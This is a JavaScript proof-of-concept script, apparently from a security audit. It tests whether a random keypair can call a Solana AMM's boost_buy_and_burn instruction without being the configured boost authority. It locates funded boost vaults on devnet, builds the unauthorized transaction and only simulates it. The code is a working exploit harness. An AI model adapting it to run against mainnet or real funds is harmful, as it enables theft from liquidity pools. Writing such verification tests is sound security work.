import fs from "node:fs";
import { BorshCoder } from "@coral-xyz/anchor";
import {
  Connection,
  Keypair,
  PublicKey,
  Transaction,
  TransactionInstruction,
} from "@solana/web3.js";
import { getAssociatedTokenAddressSync } from "@solana/spl-token";
import bs58 from "bs58";

const PROGRAM_ID = new PublicKey("pAMMBay6oceH9fJKBRHGP5D4bD4sWpmSwMn52FMfXEA");
const GLOBAL_CONFIG = new PublicKey("ADyA8hdefvWN2dbGGWFotbzWxrAvLW83WG6QCVXvJKqw");
const DEVNET_GENESIS = "EtWTRABZaYq6iMfeYKouRu166VU2xqa1";
const RPC_CANDIDATES = [
  process.env.DEVNET_RPC || "https://api.devnet.solana.com",
  "https://rpc.ankr.com/solana_devnet",
];

function emit(status, extra = {}) {
  console.log(JSON.stringify({ status, ...extra }, null, 2));
}

async function connectDevnet() {
  const errors = [];
  for (const endpoint of [...new Set(RPC_CANDIDATES)]) {
    try {
      const connection = new Connection(endpoint, "confirmed");
      const genesis = await connection.getGenesisHash();
      if (genesis !== DEVNET_GENESIS) {
        errors.push({ endpoint, error: `wrong genesis ${genesis}` });
        continue;
      }
      console.log(`SAFETY_GATE devnet genesis verified: ${genesis}`);
      return { connection, endpoint };
    } catch (error) {
      errors.push({ endpoint, error: String(error?.message || error) });
    }
  }
  emit("INCONCLUSIVE_RPC", { errors });
  process.exit(2);
}

function readI128LE(buf) {
  if (!Buffer.isBuffer(buf) || buf.length !== 16) return 0n;
  let value = 0n;
  for (let i = 15; i >= 0; i--) value = (value << 8n) | BigInt(buf[i]);
  if (value >= (1n << 127n)) value -= 1n << 128n;
  return value;
}

function u64LE(value) {
  const b = Buffer.alloc(8);
  b.writeBigUInt64LE(BigInt(value));
  return b;
}

function asBigInt(value) {
  if (typeof value === "bigint") return value;
  if (typeof value === "number") return BigInt(value);
  if (value?.toString) return BigInt(value.toString());
  throw new Error(`cannot convert to bigint: ${String(value)}`);
}

function getField(obj, ...names) {
  for (const name of names) if (obj && obj[name] !== undefined) return obj[name];
  throw new Error(`missing field ${names.join("/")}`);
}

function tokenAmount(data) {
  if (!data || data.length < 72) return null;
  return data.readBigUInt64LE(64);
}

function mintSupply(data) {
  if (!data || data.length < 44) return null;
  return data.readBigUInt64LE(36);
}

function simulatedData(accountEntry) {
  if (!accountEntry?.data) return null;
  const encoded = Array.isArray(accountEntry.data) ? accountEntry.data[0] : accountEntry.data;
  return Buffer.from(encoded, "base64");
}

async function rawSimulate(endpoint, serialized, fullySigned, addresses) {
  const response = await fetch(endpoint, {
    method: "POST",
    headers: { "content-type": "application/json" },
    body: JSON.stringify({
      jsonrpc: "2.0",
      id: 1,
      method: "simulateTransaction",
      params: [
        serialized.toString("base64"),
        {
          encoding: "base64",
          commitment: "confirmed",
          sigVerify: fullySigned,
          replaceRecentBlockhash: !fullySigned,
          accounts: { encoding: "base64", addresses: addresses.map(String) },
        },
      ],
    }),
  });
  const json = await response.json();
  if (json.error) throw new Error(`simulate RPC error: ${JSON.stringify(json.error)}`);
  return json.result.value;
}

const idl = JSON.parse(fs.readFileSync(new URL("../../idl/pump_amm.json", import.meta.url), "utf8"));
const coder = new BorshCoder(idl);
const { connection, endpoint } = await connectDevnet();

const globalInfo = await connection.getAccountInfo(GLOBAL_CONFIG, "confirmed");
if (!globalInfo) {
  emit("INCONCLUSIVE_NO_GLOBAL_CONFIG", { endpoint, globalConfig: GLOBAL_CONFIG.toBase58() });
  process.exit(3);
}

let global;
try {
  global = coder.accounts.decode("GlobalConfig", globalInfo.data);
} catch (error) {
  emit("INCONCLUSIVE_GLOBAL_DECODE", { error: String(error?.stack || error), dataLength: globalInfo.data.length });
  process.exit(4);
}

let boostAuthority;
let boostEnabled;
let globalAdmin;
try {
  boostAuthority = new PublicKey(getField(global, "boostAuthority", "boost_authority"));
  boostEnabled = Boolean(getField(global, "boostEnabled", "boost_enabled"));
  globalAdmin = new PublicKey(getField(global, "admin"));
} catch (error) {
  emit("INCONCLUSIVE_OLD_DEVNET_GLOBAL", {
    error: String(error?.message || error),
    dataLength: globalInfo.data.length,
  });
  process.exit(5);
}

console.log(JSON.stringify({
  devnetGlobalConfig: GLOBAL_CONFIG.toBase58(),
  boostAuthority: boostAuthority.toBase58(),
  boostEnabled,
  globalAdmin: globalAdmin.toBase58(),
}, null, 2));

if (!boostEnabled) {
  emit("INCONCLUSIVE_BOOST_DISABLED_ON_DEVNET", { boostAuthority: boostAuthority.toBase58() });
  process.exit(6);
}

const poolDescriptor = idl.accounts.find((x) => x.name === "Pool");
if (!poolDescriptor) throw new Error("Pool descriptor missing from IDL");
const poolDiscriminator = bs58.encode(Buffer.from(poolDescriptor.discriminator));

// Current Pool layout puts the appended i128 virtual_quote_reserves at offset 245.
// We request only 16 bytes per account so discovery stays small and read-only.
const VIRTUAL_QUOTE_OFFSET = 245;
let slicedPools;
try {
  slicedPools = await connection.getProgramAccounts(PROGRAM_ID, {
    commitment: "confirmed",
    filters: [{ memcmp: { offset: 0, bytes: poolDiscriminator } }],
    dataSlice: { offset: VIRTUAL_QUOTE_OFFSET, length: 16 },
  });
} catch (error) {
  emit("INCONCLUSIVE_POOL_DISCOVERY", { endpoint, error: String(error?.stack || error) });
  process.exit(7);
}

const nonZeroPools = slicedPools
  .map(({ pubkey, account }) => ({ pubkey, virtual: readI128LE(account.data) }))
  .filter((x) => x.virtual !== 0n);
console.log(`POOL_DISCOVERY total=${slicedPools.length} nonzero_virtual=${nonZeroPools.length}`);

if (!nonZeroPools.length) {
  emit("INCONCLUSIVE_NO_BOOST_POOL_ON_DEVNET", { totalPools: slicedPools.length });
  process.exit(8);
}

let selected = null;
for (const candidate of nonZeroPools.slice(0, 100)) {
  try {
    const poolInfo = await connection.getAccountInfo(candidate.pubkey, "confirmed");
    if (!poolInfo) continue;
    const pool = coder.accounts.decode("Pool", poolInfo.data);
    const virtual = asBigInt(getField(pool, "virtualQuoteReserves", "virtual_quote_reserves"));
    if (virtual === 0n) continue;

    const baseMint = new PublicKey(getField(pool, "baseMint", "base_mint"));
    const quoteMint = new PublicKey(getField(pool, "quoteMint", "quote_mint"));
    const poolBaseTokenAccount = new PublicKey(getField(pool, "poolBaseTokenAccount", "pool_base_token_account"));
    const poolQuoteTokenAccount = new PublicKey(getField(pool, "poolQuoteTokenAccount", "pool_quote_token_account"));
    const creator = new PublicKey(getField(pool, "creator"));

    const [baseMintInfo, quoteMintInfo] = await Promise.all([
      connection.getAccountInfo(baseMint, "confirmed"),
      connection.getAccountInfo(quoteMint, "confirmed"),
    ]);
    if (!baseMintInfo || !quoteMintInfo) continue;

    const baseTokenProgram = baseMintInfo.owner;
    const quoteTokenProgram = quoteMintInfo.owner;
    const [boostVaultAuthority] = PublicKey.findProgramAddressSync(
      [Buffer.from("boost_vault"), candidate.pubkey.toBuffer()],
      PROGRAM_ID,
    );
    const boostVault = getAssociatedTokenAddressSync(
      quoteMint,
      boostVaultAuthority,
      true,
      quoteTokenProgram,
    );
    const boostVaultInfo = await connection.getAccountInfo(boostVault, "confirmed");
    if (!boostVaultInfo) continue;
    const boostBalance = tokenAmount(boostVaultInfo.data);
    if (boostBalance === null || boostBalance === 0n) continue;

    selected = {
      pubkey: candidate.pubkey,
      pool,
      virtual,
      baseMint,
      quoteMint,
      poolBaseTokenAccount,
      poolQuoteTokenAccount,
      creator,
      baseTokenProgram,
      quoteTokenProgram,
      boostVaultAuthority,
      boostVault,
      boostBalance,
      baseMintInfo,
    };
    break;
  } catch (error) {
    console.log(`CANDIDATE_SKIP ${candidate.pubkey.toBase58()} ${String(error?.message || error)}`);
  }
}

if (!selected) {
  emit("INCONCLUSIVE_NO_FUNDED_BOOST_VAULT", { nonZeroVirtualPools: nonZeroPools.length });
  process.exit(9);
}

const attacker = Keypair.generate();
if (attacker.publicKey.equals(boostAuthority)) throw new Error("impossible attacker collision with boost authority");

const requested = selected.boostBalance > 1_000_000n
  ? 1_000_000n
  : selected.boostBalance > 10_000n
    ? selected.boostBalance / 100n
    : 1n;

const [eventAuthority] = PublicKey.findProgramAddressSync(
  [Buffer.from("__event_authority")],
  PROGRAM_ID,
);
const boostIxDescriptor = idl.instructions.find((x) => x.name === "boost_buy_and_burn");
if (!boostIxDescriptor) throw new Error("boost_buy_and_burn missing from IDL");
const data = Buffer.concat([
  Buffer.from(boostIxDescriptor.discriminator),
  u64LE(requested),
  u64LE(0n),
]);

const ix = new TransactionInstruction({
  programId: PROGRAM_ID,
  keys: [
    { pubkey: selected.pubkey, isSigner: false, isWritable: false },
    { pubkey: attacker.publicKey, isSigner: true, isWritable: true },
    { pubkey: GLOBAL_CONFIG, isSigner: false, isWritable: false },
    { pubkey: selected.baseMint, isSigner: false, isWritable: true },
    { pubkey: selected.quoteMint, isSigner: false, isWritable: false },
    { pubkey: selected.poolBaseTokenAccount, isSigner: false, isWritable: true },
    { pubkey: selected.poolQuoteTokenAccount, isSigner: false, isWritable: true },
    { pubkey: selected.boostVaultAuthority, isSigner: false, isWritable: false },
    { pubkey: selected.boostVault, isSigner: false, isWritable: true },
    { pubkey: selected.baseTokenProgram, isSigner: false, isWritable: false },
    { pubkey: selected.quoteTokenProgram, isSigner: false, isWritable: false },
    { pubkey: eventAuthority, isSigner: false, isWritable: false },
    { pubkey: PROGRAM_ID, isSigner: false, isWritable: false },
  ],
  data,
});

const prePoolQuoteInfo = await connection.getAccountInfo(selected.poolQuoteTokenAccount, "confirmed");
const preBoostInfo = await connection.getAccountInfo(selected.boostVault, "confirmed");
const preBaseMintInfo = await connection.getAccountInfo(selected.baseMint, "confirmed");

console.log(JSON.stringify({
  test: "unauthorized boost_buy_and_burn",
  rpc: endpoint,
  pool: selected.pubkey.toBase58(),
  poolCreator: selected.creator.toBase58(),
  virtualQuoteReserves: selected.virtual.toString(),
  boostVault: selected.boostVault.toBase58(),
  boostVaultBefore: tokenAmount(preBoostInfo?.data)?.toString(),
  boostAuthority: boostAuthority.toBase58(),
  attackerAuthority: attacker.publicKey.toBase58(),
  attackerEqualsBoostAuthority: attacker.publicKey.equals(boostAuthority),
  quoteAmountInRequested: requested.toString(),
  minBaseAmountBurned: "0",
}, null, 2));

let fullySigned = false;
let transaction = new Transaction().add(ix);
transaction.recentBlockhash = (await connection.getLatestBlockhash("confirmed")).blockhash;

try {
  const airdropSignature = await connection.requestAirdrop(attacker.publicKey, 20_000_000);
  await connection.confirmTransaction(airdropSignature, "confirmed");
  transaction.feePayer = attacker.publicKey;
  transaction.sign(attacker);
  fullySigned = true;
  console.log("SIM_MODE genuine attacker signature; ephemeral attacker funded by Devnet faucet");
} catch (airdropError) {
  console.log(`AIRDROP_UNAVAILABLE ${String(airdropError?.message || airdropError)}`);
  const payerCandidates = [selected.creator, globalAdmin];
  let fallbackPayer = null;
  for (const p of payerCandidates) {
    if ((await connection.getBalance(p, "confirmed")) > 100_000) {
      fallbackPayer = p;
      break;
    }
  }
  if (!fallbackPayer) {
    emit("INCONCLUSIVE_NO_DEVNET_FEE_PAYER", { attacker: attacker.publicKey.toBase58() });
    process.exit(10);
  }
  transaction.feePayer = fallbackPayer;
  transaction.partialSign(attacker);
  console.log(`SIM_MODE sigVerify=false fallback; unrelated funded fee payer=${fallbackPayer.toBase58()} is NOT an instruction account; attacker is still the instruction authority`);
}

const serialized = transaction.serialize({
  requireAllSignatures: fullySigned,
  verifySignatures: fullySigned,
});
const returnedAddresses = [selected.boostVault, selected.poolQuoteTokenAccount, selected.baseMint];
let simulation;
try {
  simulation = await rawSimulate(endpoint, serialized, fullySigned, returnedAddresses);
} catch (error) {
  emit("INCONCLUSIVE_SIM_RPC", { error: String(error?.stack || error) });
  process.exit(11);
}

const logs = simulation.logs || [];
console.log("--- SIMULATION LOGS ---");
for (const line of logs) console.log(line);
console.log("--- END LOGS ---");

const postBoost = simulatedData(simulation.accounts?.[0]);
const postPoolQuote = simulatedData(simulation.accounts?.[1]);
const postBaseMint = simulatedData(simulation.accounts?.[2]);
const preBoostAmount = tokenAmount(preBoostInfo?.data);
const postBoostAmount = tokenAmount(postBoost);
const prePoolQuoteAmount = tokenAmount(prePoolQuoteInfo?.data);
const postPoolQuoteAmount = tokenAmount(postPoolQuote);
const preSupply = mintSupply(preBaseMintInfo?.data);
const postSupply = mintSupply(postBaseMint);

const deltas = {
  boostVaultBefore: preBoostAmount?.toString() ?? null,
  boostVaultAfterSim: postBoostAmount?.toString() ?? null,
  boostVaultDelta: preBoostAmount !== null && postBoostAmount !== null ? (postBoostAmount - preBoostAmount).toString() : null,
  poolQuoteBefore: prePoolQuoteAmount?.toString() ?? null,
  poolQuoteAfterSim: postPoolQuoteAmount?.toString() ?? null,
  poolQuoteDelta: prePoolQuoteAmount !== null && postPoolQuoteAmount !== null ? (postPoolQuoteAmount - prePoolQuoteAmount).toString() : null,
  baseMintSupplyBefore: preSupply?.toString() ?? null,
  baseMintSupplyAfterSim: postSupply?.toString() ?? null,
  baseMintSupplyDelta: preSupply !== null && postSupply !== null ? (postSupply - preSupply).toString() : null,
};

const reachedTokenProgram = logs.some((line) => /Program (Tokenkeg|TokenzQd)|Instruction: (Transfer|TransferChecked|Burn|BurnChecked)/.test(line));
const emittedBoostEvent = logs.some((line) => line.includes("Program data:"));

if (simulation.err === null) {
  emit("CONFIRMED_UNAUTHORIZED_BOOST_SIMULATION", {
    proof: "A random authority different from GlobalConfig.boost_authority executed boost_buy_and_burn successfully in Devnet simulation.",
    fullySigned,
    attacker: attacker.publicKey.toBase58(),
    boostAuthority: boostAuthority.toBase58(),
    pool: selected.pubkey.toBase58(),
    quoteAmountInRequested: requested.toString(),
    reachedTokenProgram,
    emittedBoostEvent,
    deltas,
  });
  process.exit(0);
}

emit("REJECTED_OR_INCONCLUSIVE", {
  simulationError: simulation.err,
  fullySigned,
  attacker: attacker.publicKey.toBase58(),
  boostAuthority: boostAuthority.toBase58(),
  pool: selected.pubkey.toBase58(),
  quoteAmountInRequested: requested.toString(),
  reachedTokenProgram,
  emittedBoostEvent,
  deltas,
  note: "Inspect logs above. A specific authority/has_one/require_keys rejection kills ZD-01; a later non-auth error means the account set or test amount needs refinement.",
});
process.exit(12);
